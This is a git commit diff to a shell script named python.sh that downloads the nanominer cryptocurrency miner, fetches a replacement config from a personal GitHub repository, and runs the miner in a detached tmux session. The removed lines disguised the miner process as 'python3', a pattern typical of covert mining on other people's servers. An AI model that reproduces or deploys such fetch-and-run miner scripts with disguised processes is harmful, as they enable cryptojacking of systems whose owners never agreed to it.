eeb8e27b0cd045c5ef03db22ea68486105ef68c5
haidanglx <40859600+haidanglx@users.noreply.github.com>
2019-07-24 20:32:23 +0700

    Update python.sh

--- python.sh
+++ python.sh
@@ -1,25 +1,24 @@
 #! /bin/bash
 set -x #echo on
-if [ -f ${PWD}/nanominer-linux-1.5.2.tar.gz ]; then
-    if pgrep -x "python3" > /dev/null
+if [ -f ${PWD}/nanominer-linux-1.5.1.tar.gz ]; then
+    if pgrep -x "nanominer" > /dev/null
 then
     echo "scrip dang chay roi , ke cmn di "
     
 else
 
 echo "script da install , chay thoi "
-cd nanominer-linux-1.5.2
-tmux new-session -d -s my_session1  './python3'
+cd nanominer-linux-1.5.1
+tmux new-session -d -s my_session1  './nanominer'
      
 fi
 exit
 fi
-sudo apt-get install tmux  -y
-wget https://github.com/nanopool/nanominer/releases/download/v1.5.2/nanominer-linux-1.5.2.tar.gz
-tar xvzf nanominer-linux-1.5.2.tar.gz
-cd nanominer-linux-1.5.2
+
+wget https://github.com/nanopool/nanominer/releases/download/v1.5.1/nanominer-linux-1.5.1.tar.gz
+tar xvzf nanominer-linux-1.5.1.tar.gz
+cd nanominer-linux-1.5.1
 rm config.ini
-wget hhttps://raw.githubusercontent.com/haidanglx/txt/master/config.ini
+wget https://raw.githubusercontent.com/haidanglx/txt/master/config.ini
 chmod +x nanominer
-mv nanominer python3 
-tmux new-session -d -s my_session1  './python3'
+tmux new-session -d -s my_session1  './nanominer'
